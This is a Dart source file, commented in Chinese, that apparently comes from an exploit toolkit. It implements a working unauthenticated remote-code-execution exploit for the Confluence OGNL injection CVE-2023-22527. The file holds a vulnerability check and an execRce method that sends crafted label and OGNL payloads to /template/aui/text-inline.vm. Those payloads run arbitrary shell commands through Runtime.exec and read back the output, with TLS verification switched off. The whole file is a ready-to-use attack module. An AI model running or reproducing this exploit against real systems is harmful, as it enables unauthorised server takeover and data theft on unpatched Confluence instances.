import 'dart:io';

import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';

import 'exp_result.dart';

/// CVE-2023-22527 — Confluence OGNL 注入，无需认证。
/// 影响版本：Confluence Data Center & Server 8.0 – 8.5.3
///
/// /template/aui/text-inline.vm 端点将 label 参数直接渲染到 Velocity 模板，
/// 允许注入 #request[...] 指令访问 OGNL 执行上下文，进而将 x 参数作为 OGNL 求值。
///
/// Bug 预防：
/// 1. label 值中 \u0027 是 6 个字面字符（反斜杠+u0027），用 Dart raw-string
///    r"..." 确保不被 Dart 解释为 Unicode 转义；URI.encodeQueryComponent 会
///    将 '\' 编码为 %5C，服务端 URL 解码后还原为 \u0027，再由 Velocity/OGNL
///    解析为单引号 — 编码链必须完整，不可手动替换。
/// 2. Confluence admin 常用 HTTPS 自签证书，必须跳过证书校验。
/// 3. exec() 返回 NoSuchElementException 说明命令无输出，需 catch 后返回空。
/// 4. 哨兵标记通过 shell echo 输出而非 OGNL 字符串拼接，避免特殊字符干扰提取。
class ConfluenceExpService {
  final String baseUrl;
  final Duration timeout;

  ConfluenceExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 15),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  // Confluence 常用自签 HTTPS 证书，统一跳过校验
  http.Client _client() {
    final io = HttpClient()..badCertificateCallback = (_, __, _) => true;
    return IOClient(io);
  }

  // label 原始字符串：6 个字面字符 \u0027 由 Velocity/OGNL 解释为单引号
  // Bug 预防：Dart r-string 保证 \u0027 不被 Dart 本身解析为 '
  static const _labelRaw =
      r"\u0027+#request['\u0027.KEY_velocity.struts2.context\u0027']"
      r".internalGet('\u0027ognl\u0027')"
      r".findValue(#parameters.x[0],{})";

  Future<http.Response?> _post(String ognlExpr) async {
    final client = _client();
    try {
      // Bug 预防：encodeQueryComponent 将 \、+、#、[、' 正确百分比编码，
      // 直接拼接 body 字符串会遗漏 + 号被服务端解释为空格。
      final encodedLabel = Uri.encodeQueryComponent(_labelRaw);
      final encodedExpr  = Uri.encodeQueryComponent(ognlExpr);
      return await client
          .post(
            Uri.parse('$_base/template/aui/text-inline.vm'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'label=$encodedLabel&x=$encodedExpr',
          )
          .timeout(timeout);
    } catch (_) {
      return null;
    } finally {
      client.close();
    }
  }

  Future<ExpResult> check() async {
    // 数学验证：233*233=54289，结果嵌入 Velocity 渲染输出
    final res = await _post('233*233');
    if (res != null && res.body.contains('54289')) {
      return ExpResult(
        true,
        'CVE-2023-22527',
        'OGNL 注入验证通过，233×233=54289 已出现在响应体',
      );
    }
    return const ExpResult(false, 'CVE-2023-22527', '');
  }

  static const _sentinel = 'CONF_RCE';

  Future<String?> execRce(String cmd) async {
    // Bug 预防：转义顺序必须先反斜杠再单引号，否则已转义的 \' 中的 \ 会被二次转义
    final escaped = cmd.replaceAll(r'\', r'\\').replaceAll("'", r"\'");

    // OGNL 用 Scanner.useDelimiter("\u005cA") 读取完整 stdout。
    // "\u005cA" 在 OGNL Java 字符串字面量中 = \A（regex 流起始锚点 → 全量读取）。
    // Bug 预防：Dart raw-string r'"\u005cA"' 确保 \u005c 作为字面量发给服务端，
    //   服务端 OGNL 再将其解释为 Java unicode 转义 → 反斜杠字符 → regex \A。
    final ognl =
        "'${_sentinel}_S'"
        '+(new java.util.Scanner('
        "@java.lang.Runtime@getRuntime()"
        ".exec(new String[]{'sh','-c','$escaped'})"
        '.getInputStream()'
        r').useDelimiter("\u005cA").next())'
        "+'${_sentinel}_E'";

    final res = await _post(ognl);
    if (res == null) return null;

    final body = res.body;
    final s = body.indexOf('${_sentinel}_S');
    final e = body.indexOf('${_sentinel}_E');
    if (s != -1 && e != -1 && e > s) {
      return body.substring(s + '${_sentinel}_S'.length, e).trim();
    }
    // Scanner.next() 在进程无输出时抛 NoSuchElementException，OGNL 求值失败，
    // 响应体无哨兵但状态码通常仍 200；此时返回 null 而非响应体全文（降噪）
    return null;
  }
}
